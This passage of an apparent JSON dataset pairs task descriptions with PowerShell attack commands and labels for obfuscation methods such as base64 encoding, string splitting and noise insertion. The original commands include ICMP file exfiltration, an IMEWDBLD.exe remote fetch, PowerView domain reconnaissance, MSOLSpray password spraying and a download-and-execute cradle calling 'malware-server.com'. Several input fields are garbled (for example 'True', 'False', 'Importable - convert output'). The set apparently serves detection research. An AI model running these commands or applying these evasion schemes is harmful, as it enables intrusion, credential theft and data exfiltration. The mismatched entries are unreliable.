    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Paraphrase: Ping a specified IP address by sending data read from a file.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "output": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "Paraphrase: Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "IME (Input Method Editor) component on a remote system.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "Paraphrase: Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "IME (Input Method Editor) component on a remote system.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "Paraphrase: Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "IME (Input Method Editor) component on a remote system.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "Paraphrase: Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "IME (Input Method Editor) component on a remote system.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command involving the IME (Input Method Editor) component on a remote system.",
    "origin_cmd": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${rem_URL}"
  },
  {
    "input": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "output": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Importable - convert output to JSON format .",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Importable - convert output to JSON format .",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Importable - convert output to JSON format .",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Importable - convert output to JSON format .",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve information about the domain, converting the output to JSON format.",
    "origin_cmd": "Import-Module .\\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1"
  },
  {
    "input": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "output": "certutil -addstore my ${pfx_path}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Add a certificate to the \"Personal\" certificate store using certutil.",
    "origin_cmd": "certutil -addstore my ${pfx_path}"
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "output": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import a module and perform Office 365 credential spraying using MSOLSpray.",
    "origin_cmd": "import-module \"$env:temp\\MSOLSpray.ps1\" ; Invoke-MSOLSpray -UserList \"${user_list}\" -Password \"${password}\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": ": The: Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": ": The: Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
